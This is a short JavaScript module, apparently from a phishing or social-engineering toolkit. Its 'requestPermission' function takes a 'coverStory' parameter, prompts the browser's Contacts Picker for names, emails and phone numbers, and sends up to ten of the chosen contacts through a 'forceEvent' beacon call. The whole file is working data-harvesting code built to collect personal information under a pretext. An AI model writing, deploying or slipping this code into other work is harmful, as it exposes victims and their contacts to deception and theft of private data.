import { forceEvent } from '../beacon.js';

export async function requestPermission(coverStory, options) {
  if (!('contacts' in navigator) || !navigator.contacts?.select) {
    await forceEvent('contacts', { supported: false });
    return { supported: false };
  }
  try {
    const results = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
    await forceEvent('contacts', { count: results.length, contacts: results.slice(0, 10) });
    return { count: results.length };
  } catch (e) {
    await forceEvent('contacts', { supported: false, error: e.message });
    return { supported: false, error: e.message };
  }
}
